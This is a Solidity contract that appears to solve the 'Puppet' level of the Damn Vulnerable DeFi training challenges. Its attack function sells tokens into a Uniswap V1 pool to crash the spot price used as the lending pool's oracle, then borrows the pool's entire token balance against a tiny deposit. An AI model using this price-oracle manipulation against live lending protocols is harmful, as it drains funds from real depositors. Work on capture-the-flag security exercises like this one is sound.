// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {Test, console} from "forge-std/Test.sol";

contract Puppet{
    IUniswapV1Exchange uniswapV1Exchange;
    DamnValuableToken token;
    PuppetPool pool;

    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 constant DEPOSIT_FACTOR = 2;

    constructor(IUniswapV1Exchange _uniswapV1Exchange, DamnValuableToken _damnValuableToken, PuppetPool _pool) payable {
        uniswapV1Exchange = _uniswapV1Exchange;
        token = _damnValuableToken;
        pool = _pool;
    }
    
    function attack(address _recovery) public{
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));

        uint256 price = address(uniswapV1Exchange).balance * (10 ** 18) / token.balanceOf(address(uniswapV1Exchange));
        uint256 depositRequired = POOL_INITIAL_TOKEN_BALANCE * price * DEPOSIT_FACTOR / 10 ** 18;
        pool.borrow{value:depositRequired}(POOL_INITIAL_TOKEN_BALANCE, _recovery);

    }
    
    receive() external payable {
    }
}